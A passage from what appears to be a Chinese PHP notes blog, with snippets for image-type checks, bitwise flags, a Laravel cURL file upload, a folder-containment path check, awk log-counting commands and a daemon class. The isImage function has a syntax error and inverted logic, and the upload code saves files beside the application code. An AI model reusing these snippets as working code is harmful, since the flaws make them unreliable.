bin2hex(substr($source,<span class="number">-2</span>));</span><br><span class="line">            <span class="keyword">default</span> : <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">var_dump(check_img_by_source(file_get_contents(<span class="string">'11.gif'</span>));</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isImage</span>(<span class="params">$filename</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $types = <span class="string">'.gif|.jpeg|.png|.bmp'</span>;  <span class="comment">//定义检查的图片类型</span></span><br><span class="line">    <span class="keyword">if</span>(file_exists($filename))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (($info = @getimagesize($filename))</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        $ext = image_type_to_extension($info[<span class="string">'2'</span>]);</span><br><span class="line">        <span class="keyword">return</span> stripos($types,$ext);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(isImage(<span class="string">'isimg.txt'</span>)!==<span class="literal">false</span>)</span><br><span class="line">&#123;</span><br><span class="line">    echo isImage(<span class="string">'1.jpg'</span>);</span><br><span class="line">    echo <span class="string">'是图片'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    echo <span class="string">'不是图片'</span>;</span><br><span class="line">&#125;</span><br><span class="line">$mimetype = exif_imagetype(<span class="string">"1.jpg"</span>);</span><br><span class="line"><span class="keyword">if</span> ($mimetype == IMAGETYPE_GIF || $mimetype == IMAGETYPE_JPEG || $mimetype == IMAGETYPE_PNG || $mimetype == IMAGETYPE_BMP)</span><br><span class="line">&#123;</span><br><span class="line">    echo <span class="string">"是图片"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="位运算"><a href="#位运算" class="headerlink" title="位运算"></a>位运算</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LightControl</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">const</span> TURN_ON_ALL = <span class="number">0b11111</span>;</span><br><span class="line">    <span class="keyword">const</span> KITCHEN     = <span class="number">0b10000</span>;</span><br><span class="line">    <span class="keyword">const</span> SECOND_LIE  = <span class="number">0b01000</span>;</span><br><span class="line">    <span class="keyword">const</span> DINING_ROOM = <span class="number">0b00100</span>;</span><br><span class="line">    <span class="keyword">const</span> LIVING_ROOM = <span class="number">0b00010</span>;</span><br><span class="line">    <span class="keyword">const</span> MASTER_ROOM = <span class="number">0b00001</span>;</span><br><span class="line"></span><br><span class="line">    private $options;</span><br><span class="line"></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$options = <span class="number">0</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $<span class="keyword">this</span>-&gt;options = $options;</span><br><span class="line">        echo <span class="string">'主卧'</span>, <span class="string">"\t"</span>;</span><br><span class="line">        echo <span class="string">'客厅'</span>, <span class="string">"\t"</span>;</span><br><span class="line">        echo <span class="string">'餐厅'</span>, <span class="string">"\t"</span>;</span><br><span class="line">        echo <span class="string">'次卧'</span>, <span class="string">"\t"</span>;</span><br><span class="line">        echo <span class="string">'厨房'</span>, <span class="string">"\t"</span>, PHP_EOL;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">getOptions</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> $<span class="keyword">this</span>-&gt;options;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">setOptions</span>(<span class="params">$options</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $<span class="keyword">this</span>-&gt;options = $options;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">showOptions</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        echo self::getOption($<span class="keyword">this</span>-&gt;options, <span class="attr">self</span>::MASTER_ROOM), <span class="string">"\t"</span>;</span><br><span class="line">        echo self::getOption($<span class="keyword">this</span>-&gt;options, <span class="attr">self</span>::LIVING_ROOM), <span class="string">"\t"</span>;</span><br><span class="line">        echo self::getOption($<span class="keyword">this</span>-&gt;options, <span class="attr">self</span>::DINING_ROOM), <span class="string">"\t"</span>;</span><br><span class="line">        echo self::getOption($<span class="keyword">this</span>-&gt;options, <span class="attr">self</span>::SECOND_LIE), <span class="string">"\t"</span>;</span><br><span class="line">        echo self::getOption($<span class="keyword">this</span>-&gt;options, <span class="attr">self</span>::KITCHEN);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//获取指定灯的开关状态https://laravel-china.org/articles/22312</span></span><br><span class="line">    private <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getOption</span>(<span class="params">$options, $option</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> intval(($options &amp; $option) &gt; <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$lightControl = <span class="keyword">new</span> LightControl();</span><br><span class="line">$lightControl-&gt;showOptions();</span><br><span class="line">主卧  客厅  餐厅  次卧  厨房  </span><br><span class="line"><span class="number">0</span>   <span class="number">0</span>   <span class="number">0</span>   <span class="number">0</span>   <span class="number">0</span></span><br><span class="line">$lightControl = <span class="keyword">new</span> LightControl(LightControl::TURN_ON_ALL ^ LightControl::KITCHEN);</span><br><span class="line">$lightControl-&gt;showOptions();</span><br><span class="line">主卧  客厅  餐厅  次卧  厨房  </span><br><span class="line"><span class="number">1</span>   <span class="number">1</span>   <span class="number">1</span>   <span class="number">1</span>   <span class="number">0</span></span><br></pre></td></tr></table></figure>
<h3 id="CURL-发送文件"><a href="#CURL-发送文件" class="headerlink" title="CURL 发送文件"></a>CURL 发送文件</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action=<span class="string">"/testFile"</span> method=<span class="string">"post"</span> enctype=<span class="string">"multipart/form-data"</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">"file"</span> name=<span class="string">"file"</span> /&gt;</span><br><span class="line">    &lt;input type=<span class="string">"submit"</span> /&gt;</span><br><span class="line">&lt;<span class="regexp">/form&gt;</span></span><br><span class="line"><span class="regexp">public function testFile(Request $request)&#123;</span></span><br><span class="line"><span class="regexp">        $data = array(</span></span><br><span class="line"><span class="regexp">            'file'=&gt; new \CURLFile(realpath($request-&gt;file('file')-&gt;path())),</span></span><br><span class="line"><span class="regexp">        );</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">        $ch = curl_init();</span></span><br><span class="line"><span class="regexp">        curl_setopt($ch, CURLOPT_URL,"/</span>testLoadFile<span class="string">");//此处以当前服务器为接收地址</span></span><br><span class="line"><span class="string">        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);</span></span><br><span class="line"><span class="string">        curl_setopt($ch, CURLOPT_TIMEOUT,10);//设置最长等待时间</span></span><br><span class="line"><span class="string">        curl_setopt($ch, CURLOPT_POST, 1);//post提交</span></span><br><span class="line"><span class="string">        curl_setopt($ch, CURLOPT_POSTFIELDS, $data);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        $data = curl_exec($ch);//执行</span></span><br><span class="line"><span class="string">        if(curl_errno($ch))&#123;</span></span><br><span class="line"><span class="string">            return curl_error($ch);</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        curl_close($ch);//释放</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        return json_encode($data);</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    public function testLoadFile(Request $request)&#123;</span></span><br><span class="line"><span class="string">            if ($request-&gt;hasFile('file')) &#123;</span></span><br><span class="line"><span class="string">                if ($request-&gt;file('file')-&gt;isValid())&#123;</span></span><br><span class="line"><span class="string">                    // 上传成功</span></span><br><span class="line"><span class="string">                    // 随机名字 . 后缀</span></span><br><span class="line"><span class="string">                    $fileName = "</span>other/<span class="string">".Date("</span>YmdHis<span class="string">").substr(md5(time()),5,15)."</span>.<span class="string">".$request-&gt;file("</span>file<span class="string">")-&gt;extension();// 需要 开启php_fileinfo 扩展 否则会报错</span></span><br><span class="line"><span class="string">                    // 获取临时上传的路径（如果不存在本地，则方法调用完之后，会被删除）</span></span><br><span class="line"><span class="string">                    //$fileUrl = $request-&gt;file('file')-&gt;path();</span></span><br><span class="line"><span class="string">                    // 可选存储在本地</span></span><br><span class="line"><span class="string">                    $fileUrl = $request-&gt;file("</span>file<span class="string">")-&gt;move(__DIR__."</span>/<span class="string">",$fileName);</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">                    return ($fileUrl);</span></span><br><span class="line"><span class="string">                &#125;</span></span><br><span class="line"><span class="string">            &#125;</span></span><br><span class="line"><span class="string">            return json_encode([]);</span></span><br><span class="line"><span class="string">        &#125;</span></span><br></pre></td></tr></table></figure>
<h3 id="验证图片安全"><a href="#验证图片安全" class="headerlink" title="验证图片安全"></a>验证图片安全</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 检查某个路径是否在指定文件夹内。若为真，返回此路径，否则返回 false。</span></span><br><span class="line"><span class="comment"> * @param String $path 被检查的路径https://laravel-china.org/topics/19624</span></span><br><span class="line"><span class="comment"> * @param String $folder 文件夹的路径，$path 必须在此文件夹内</span></span><br><span class="line"><span class="comment"> * @return bool|string 失败返回 false，成功返回 $path</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkPathIsInFolder</span>(<span class="params">$path, $folder</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> ($path === <span class="string">''</span> OR $path === <span class="literal">null</span> OR $path === <span class="literal">false</span> OR $folder === <span class="string">''</span> OR $folder === <span class="literal">null</span> OR $folder === <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="comment">/* 不能使用 empty() 因为有可能像 "0" 这样的字符串也是有效的路径 */</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    $folderRealpath = realpath($folder);</span><br><span class="line">    $pathRealpath = realpath($path);</span><br><span class="line">    <span class="keyword">if</span> ($pathRealpath === <span class="literal">false</span> OR $folderRealpath === <span class="literal">false</span>) &#123;</span><br><span class="line">        <span class="comment">// Some of paths is empty</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    $folderRealpath = rtrim($folderRealpath, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR;</span><br><span class="line">    $pathRealpath = rtrim($pathRealpath, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR;</span><br><span class="line">    <span class="keyword">if</span> (strlen($pathRealpath) &lt; strlen($folderRealpath)) &#123;</span><br><span class="line">        <span class="comment">// 文件路径比文件夹路径短，那么这个文件不可能在此文件夹内。</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (substr($pathRealpath, <span class="number">0</span>, strlen($folderRealpath)) !== $folderRealpath) &#123;</span><br><span class="line">        <span class="comment">// 文件夹的路径不等于它必须位于的文件夹的路径。</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// OK</span></span><br><span class="line">    <span class="keyword">return</span> $path;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="shell-1"><a href="#shell-1" class="headerlink" title="shell"></a>shell</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>、查看当天有多少个IP访问：</span><br><span class="line"></span><br><span class="line">awk <span class="string">'&#123;print $1&#125;'</span> log_file|sort|uniq|wc -l</span><br><span class="line">　　<span class="number">2</span>、查看某一个页面被访问的次数：</span><br><span class="line"></span><br><span class="line">grep <span class="string">"/index.php"</span> log_file | wc -l</span><br><span class="line">　　<span class="number">3</span>、查看每一个IP访问了多少个页面：</span><br><span class="line"></span><br><span class="line">awk <span class="string">'&#123;++S[$1]&#125; END &#123;for (a in S) print a,S[a]&#125;'</span> log_file</span><br><span class="line">　　<span class="number">4</span>、将每个IP访问的页面数进行从小到大排序：</span><br><span class="line"></span><br><span class="line">awk <span class="string">'&#123;++S[$1]&#125; END &#123;for (a in S) print S[a],a&#125;'</span> log_file | sort -n</span><br><span class="line">　　<span class="number">5</span>、查看某一个IP访问了哪些页面：</span><br><span class="line"></span><br><span class="line">grep ^<span class="number">111.111</span><span class="number">.111</span><span class="number">.111</span> log_file| awk <span class="string">'&#123;print $1,$7&#125;'</span></span><br><span class="line">　　<span class="number">6</span>、去掉搜索引擎统计当天的页面：</span><br><span class="line"></span><br><span class="line">awk <span class="string">'&#123;print $12,$1&#125;'</span> log_file | grep ^\<span class="string">"Mozilla | awk '&#123;print $2&#125;' |sort | uniq | wc -l</span></span><br><span class="line"><span class="string">　　7、查看2018年11月21日14时这一个小时内有多少IP访问：</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">awk '&#123;print $4,$1&#125;' log_file | grep 21/Nov/2018:14 | awk '&#123;print $2&#125;'| sort | uniq | wc -l</span></span><br><span class="line"><span class="string">　　8、列出当天访问次数最多的IP</span></span><br><span class="line"><span class="string">表示用-分割 表示打印第一部分 将重复行去掉， -c表示前面前面加上数目 按照数字从大到小排序</span></span><br><span class="line"><span class="string">cut -d- -f 1 log_file |uniq -c | sort -rn | head -20</span></span><br></pre></td></tr></table></figure>
<h3 id="守护进程"><a href="#守护进程" class="headerlink" title="守护进程"></a>守护进程</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Deamon</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    protected $_pidFile;</span><br><span class="line"></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $<span class="keyword">this</span>-&gt;_pidFile = <span class="string">'/var/www/html/queue/public/pid.log'</span>;</span><br><span class="line">        $<span class="keyword">this</span>-&gt;_checkPcntl();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 创建守护进程核心函数</span></span><br><span class="line"><span class="comment">     * @return string|void</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    private <span class="function"><span class="keyword">function</span> <span class="title">_demonize</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (php_sapi_name() != <span class="string">'cli'</span>) &#123;</span><br><span class="line">            die(<span class="string">'Should run in CLI'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//创建子进程</span></span><br><span class="line">        $pid = pcntl_fork();</span><br><span class="line">        <span class="keyword">if</span> ($pid == <span class="number">-1</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">'fork faile'</span>;</span><br><span class="line">        &#125; elseif ($pid) &#123;</span><br><span class="line">            <span class="comment">//终止父进程</span></span><br><span class="line">            exit(<span class="string">'parent process'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//在子进程中创建新的会话</span></span><br><span class="line">        <span class="keyword">if</span> (posix_setsid() === <span class="number">-1</span>) &#123;</span><br><span class="line">            die(<span class="string">'Could not detach'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//改变工作目录</span></span><br><span class="line">        chdir(<span class="string">'/'</span>);</span><br><span class="line">        <span class="comment">//重设文件创建的掩码</span></span><br><span class="line">        umask(<span class="number">0</span>);</span><br><span class="line">        $fp = fopen($<span class="keyword">this</span>-&gt;_pidFile, <span class="string">'w'</span>) or die(<span class="string">"Can't create pid file"</span>);</span><br><span class="line">        <span class="comment">//把当前进程的id写入到文件中</span></span><br><span class="line">        fwrite($fp, posix_getpid());</span><br><span class="line">        fclose($fp);</span><br><span class="line">        <span class="comment">//关闭文件描述符</span></span><br><span class="line">        fclose(STDIN);</span><br><span class="line">        fclose(STDOUT);</span><br><span class="line">        fclose(STDERR);</span><br><span class="line">        <span class="comment">//运行守护进程的逻辑</span></span><br><span class="line">        $<span class="keyword">this</span>-&gt;job();</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 守护进程的任务</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    private <span class="function"><span class="keyword">function</span> <span class="title">job</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">//TODO 你的守护经常需要执行的任务</span></span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">            file_put_contents(<span class="string">'/var/www/html/queue/public/job.log'</span>, <span class="string">'job'</span> . PHP_EOL, FILE_APPEND);</span><br><span class="line">            sleep(<span class="number">5</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 获取守护进程的id</span></span><br><span class="line"><span class="comment">     * @return int</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    private <span class="function"><span class="keyword">function</span> <span class="title">_getPid</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">//判断存放守护进程id的文件是否存在</span></span><br><span class="line">        <span class="keyword">if</span> (!file_exists($<span class="keyword">this</span>-&gt;_pidFile)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $pid = intval(file_get_contents($<span class="keyword">this</span>-&gt;_pidFile));</span><br><span class="line">        <span class="keyword">if</span> (posix_kill($pid, SIG_DFL)) &#123;<span class="comment">//判断该进程是否正常运行中</span></span><br><span class="line">            <span class="keyword">return</span> $pid;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            unlink($<span class="keyword">this</span>-&gt;_pidFile);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 判断pcntl拓展</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    private <span class="function"><span class="keyword">function</span> <span class="title">_checkPcntl</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        !function_exists(<span class="string">'pcntl_signal'</span>) &amp;&amp; die(<span class="string">'Error:Need PHP Pcntl extension!'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private <span class="function"><span class="keyword">function</span> <span class="title">_message</span>(<span class="params">$message</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        printf(<span class="string">"%s  %d %d  %s"</span> . PHP_EOL, date(<span class="string">"Y-m-d H:i:s"</span>), posix_getpid(), posix_getppid(), $message);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 开启守护进程</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    private <span class="function"><span class="keyword">function</span> <span class="title">start</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> ($<span class="keyword">this</span>-&gt;_getPid() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            $<span class="keyword">this</span>-&gt;_message(<span class="string">'Running'</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $<span class="keyword">this</span>-&gt;_demonize();</span><br><span class="line">            $<span class="keyword">this</span>-&gt;_message(<span class="string">'Start'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 停止守护进程</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    private <span class="function"><span class="keyword">function</span> <span class="title">stop</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $pid = $<span class="keyword">this</span>-&gt;_getPid();</span><br><span class="line">        <span class="keyword">if</span> ($pid &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">//通过向进程id发送终止信号来停止进程</span></span><br><span class="line">            posix_kill($pid, SIGTERM);</span><br><span class="line">            unlink($<span class="keyword">this</span>-&gt;_pidFile);</span><br><span class="line">            echo <span class="string">'Stoped'</span> . PHP_EOL;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            echo <span class="string">"Not Running"</span> . PHP_EOL;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private <span class="function"><span class="keyword">function</span> <span class="title">status</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> ($<span class="keyword">this</span>-&gt;_getPid() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            $<span class="keyword">this</span>-&gt;_message(<span class="string">'Is Running'</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            echo <span class="string">'Not Running'</span> . PHP_EOL;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">run</span>(<span class="params">$argv</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $param = is_array($argv) &amp;&amp; count($argv) == <span class="number">2</span> ? $argv[<span class="number">1</span>] : <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">switch</span> ($param) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span 